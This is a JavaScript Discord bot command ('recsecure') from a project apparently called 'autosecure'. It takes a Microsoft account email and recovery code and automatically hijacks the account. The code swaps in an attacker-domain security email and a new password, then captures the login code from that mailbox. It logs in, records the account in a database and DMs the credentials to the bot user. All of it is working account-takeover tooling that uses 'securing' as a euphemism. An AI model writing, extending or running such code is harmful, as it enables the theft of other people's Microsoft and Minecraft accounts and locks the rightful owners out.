const { ButtonBuilder, ButtonStyle, ActionRowBuilder, EmbedBuilder } = require('discord.js');
const recoveryCodeSecure = require('../../../autosecure/utils/secure/recoveryCodeSecure.js');
const { domains } = require("../../../config.json");
const generate = require('../../utils/generate');
const { getEmailDescription } = require('../../utils/utils/getEmailDescription.js');
const listAccount = require("../../../autosecure/utils/accounts/listAccount.js");
const login = require('../../utils/secure/login.js');
const { queryParams } = require("../../../db/database.js");
const secure = require('../../../autosecure/utils/secure/recodesecure.js');
const generateuid = require('../../../autosecure/utils/generateuid.js');
const getCredentials = require('../../../autosecure/utils/info/getCredentials.js');
const insertaccount = require("../../../db/insertaccount");
const statsembed = require("../../../autosecure/utils/stats/statsembed.js");
const mcregex = require("../../../autosecure/utils/utils/mcregex.js");
const { failedembed } = require('../../../autosecure/utils/embeds/embedhandler.js');
const sendotp = require("../../../autosecure/utils/secure/sendotp.js");
const { initializesecure, updateStatus } = require('../../../autosecure/utils/process/helpers.js');

async function couldntFullSecure(interaction, data, reason, uid) {
    let recsecId = generate(32);
    await queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [`${recsecId}`, `copyrec|${data.email2}|${data.secEmail}|${data.password}|${data.recoveryCode}`]
    );

    if (uid) {
        await updateStatus(uid, "status", `Failed: ${reason}`).catch(() => {});
    }

    const msg = {
        embeds: [
            new EmbedBuilder()
                .setTitle(`⚠️ Couldn't full-secure: ${reason}`)
                .setDescription("Account details below (click button to copy):")
                .addFields(
                    { name: "Email", value: "```\n" + data.email2 + "\n```", inline: true },
                    { name: "Security Email", value: "```\n" + data.secEmail + "\n```", inline: true },
                    { name: "Password", value: "```\n" + data.password + "\n```", inline: false },
                    { name: "Recovery Code", value: "```\n" + data.recoveryCode + "\n```", inline: false }
                )
                .setColor(0xe67e22)
        ],
        components: [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`copyrec|${recsecId}`)
                    .setLabel('📋 Copy Text')
                    .setStyle(ButtonStyle.Secondary)
            )
        ],
        ephemeral: true
    };

    await interaction.user.send(msg).catch(() => {});
    return interaction.editReply(msg).catch(() => {});
}

module.exports = {
    name: "recsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        // 1. Acknowledge modal immediately to close dialog in Discord client
        try {
            await interaction.deferReply({ ephemeral: true });
        } catch (deferErr) {
            console.error('[RECSECURE] Error deferring reply:', deferErr.message);
        }

        const processStartTime = Date.now();

        // 2. Safe field extraction
        let email = "";
        let recoveryCode = "";
        let mcign = null;

        try {
            if (interaction.fields?.getTextInputValue) {
                try { email = interaction.fields.getTextInputValue("email"); } catch (e) {}
                try { recoveryCode = interaction.fields.getTextInputValue("auth"); } catch (e) {}
                try { mcign = interaction.fields.getTextInputValue("username"); } catch (e) {}
            }
            if (!email && interaction.components?.[0]?.components?.[0]?.value) {
                email = interaction.components[0].components[0].value;
            }
            if (!recoveryCode && interaction.components?.[1]?.components?.[0]?.value) {
                recoveryCode = interaction.components[1].components[0].value;
            }
            if (!mcign && interaction.components?.[2]?.components?.[0]?.value) {
                mcign = interaction.components[2].components[0].value;
            }
        } catch (extractErr) {
            console.error('[RECSECURE] Error extracting modal fields:', extractErr);
        }

        email = (email || "").trim();
        recoveryCode = (recoveryCode || "").trim();
        mcign = mcign ? mcign.trim() : null;

        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            return interaction.editReply({
                content: "❌ Please enter a valid email address!"
            }).catch(() => {});
        }
        if (!recoveryCode || !/^[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}$/.test(recoveryCode)) {
            return interaction.editReply({
                content: "❌ Please enter a valid 25-character recovery code (format: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX)!"
            }).catch(() => {});
        }
        if (mcign && !mcregex(mcign)) {
            return interaction.editReply({
                content: "❌ Please enter a valid Minecraft username!"
            }).catch(() => {});
        }

        let settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id]);
        if (!settings || settings.length === 0) {
            await queryParams(`INSERT OR IGNORE INTO secureconfig (user_id) VALUES (?)`, [interaction.user.id]);
            settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id]);
            if (!settings || settings.length === 0) {
                return interaction.editReply({
                    content: `❌ Couldn't load your settings! Please report this to an admin.`
                }).catch(() => {});
            }
        }
        settings = settings[0];

        const uid = await generateuid();
        await initializesecure(uid);

        const rawPrefix = settings?.prefix || "hachiiromc";
        const prefix = String(rawPrefix).toLowerCase();
        const secEmail = `${prefix}${generate(10).toLowerCase()}@${(settings?.domain || domains[0]).toLowerCase()}`;
        const password = generate(16);

        await updateStatus(uid, "email", email);
        await updateStatus(uid, "secemail", secEmail);
        await updateStatus(uid, "password", password);

        const embed = {
            title: `This account is being automatically secured, you will be dmed when finished`,
            color: 0x808080
        };

        const statusComponents = [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`status|${uid}`)
                    .setLabel('📊 Status')
                    .setStyle(ButtonStyle.Primary)
            )
        ];

        await interaction.editReply({
            embeds: [embed],
            components: statusComponents
        }).catch(console.error);

        try {
            const data = await recoveryCodeSecure(email, recoveryCode, secEmail, password);
            console.log('recoveryCodeSecure response:', JSON.stringify(data, null, 2));

            if (data === null) {
                return interaction.editReply({ content: `❌ Invalid email address`, embeds: [], components: [] }).catch(() => {});
            }
            if (data === 'tfa') {
                return interaction.editReply({ content: `❌ Cannot secure when 2FA is enabled.`, embeds: [], components: [] }).catch(() => {});
            }
            if (data === 'invalid') {
                return interaction.editReply({ content: `❌ Invalid Recovery Code!`, embeds: [], components: [] }).catch(() => {});
            }
            if (data === 'same') {
                return interaction.editReply({
                    content: `❌ You entered the same password or security email for securing or Microsoft is giving invalid responses!`,
                    embeds: [],
                    components: []
                }).catch(() => {});
            }
            if (data?.error) {
                return interaction.editReply({
                    content: `❌ An unexpected error occurred: ${data.error}`,
                    embeds: [],
                    components: []
                }).catch(() => {});
            }
            if (!data?.email2 || !data?.recoveryCode || !data?.secEmail || !data?.password) {
                console.error('Invalid data structure from recoveryCodeSecure:', JSON.stringify(data, null, 2));
                return interaction.editReply({
                    content: `❌ An unexpected error occurred: Invalid data structure from securing process`,
                    embeds: [],
                    components: []
                }).catch(() => {});
            }

            await updateStatus(uid, "recoverycode", data.recoveryCode);

            const time = Date.now();
            let profiles = await getCredentials(data.email2, false);

            if (!profiles?.Credentials?.OtcLoginEligibleProofs || profiles.Credentials.OtcLoginEligibleProofs.length === 0) {
                return couldntFullSecure(interaction, data, "Failed to find sec emails.", uid);
            }

            let secEmail1 = profiles.Credentials.OtcLoginEligibleProofs[0];
            const otpSent = await sendotp(data.email2, secEmail1.data);

            const waitForOtp = async (startTime, secEmail, timeoutMs = 120000, intervalMs = 3000) => {
                const deadline = Date.now() + timeoutMs;
                while (Date.now() < deadline) {
                    try {
                        const code = await getEmailDescription(startTime, secEmail, true);
                        if (code) return code;
                    } catch (err) {
                        console.error("Error while fetching OTP:", err);
                    }
                    await new Promise(r => setTimeout(r, intervalMs));
                }
                return null;
            };

            let code = null;
            if (otpSent) {
                code = await waitForOtp(time, data.secEmail);
            }

            if (otpSent && code) {
                const host = await login({ email: data.email2, id: secEmail1.data, code: code }, null);
                if (!host) {
                    return couldntFullSecure(interaction, data, "OTP Disabled before login!", uid);
                }

                const processEndTime = Date.now();
                const rectaken = (processEndTime - processStartTime) / 1000;

                const acc = await secure(host, settings, uid, mcign);
                await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);

                const failedmsg = await failedembed(acc, uid);
                if (failedmsg.failed) {
                    await interaction.followUp(failedmsg.failedmsg).catch(() => {});
                    await interaction.user.send(failedmsg.failedmsg).catch(() => {});
                    return;
                }

                let timetaken = parseFloat(acc.timeTaken) + rectaken;
                acc.timeTaken = Math.round(timetaken);

                const msg = await listAccount(acc, uid, client, interaction);

                await interaction.followUp({
                    ...msg,
                    ephemeral: true
                }).catch(() => {});
                await interaction.user.send(msg).catch(() => {});

                return;
            } else {
                let reason;
                if (!otpSent) {
                    reason = "Couldn't send OTP code!";
                } else if (!code) {
                    reason = "Microsoft sent no code email or it wasn't captured in time!";
                } else {
                    reason = "Couldn't extract code from email!";
                }
                return couldntFullSecure(interaction, data, reason, uid);
            }
        } catch (err) {
            console.error('[RECSECURE] Unexpected error:', err);
            await interaction.editReply({
                content: `❌ An unexpected error occurred during securing: ${err.message}`,
                embeds: [],
                components: []
            }).catch(() => {});
        }
    }
};